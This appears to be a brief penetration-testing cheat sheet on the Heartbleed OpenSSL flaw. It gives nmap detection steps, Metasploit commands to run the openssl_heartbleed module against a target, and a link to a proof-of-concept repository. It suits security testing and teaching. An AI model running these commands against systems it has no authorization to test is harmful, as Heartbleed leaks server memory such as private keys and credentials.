# Heartbleed

## Overview of the Heartbleed exploit

## Detecting Heartbleed

### Nmap

Put the ssl-heartbleed.nse in your nmap scripts directory `/usr/share/nmap/scripts`

Put tls.lua in the nmap "nselib" library `/usr/share/nmap/nselib`

Run the command

> `nmap -sV -script=ssl-heartbleed <target>`

## Exploiting with Metasploit

Search for the heartbleed module

> `search heartbleed`

Use the scanner

> `use auxiliary/scanner/ssl/openssl_heartbleed`

Set Exploit option

> `set verbose true`
>
> `set rhosts [targetIP]`

Run the Exploit

> `run`

## Heartbleed PoC

[https://github.com/mpgn/heartbleed-PoC](https://github.com/mpgn/heartbleed-PoC)

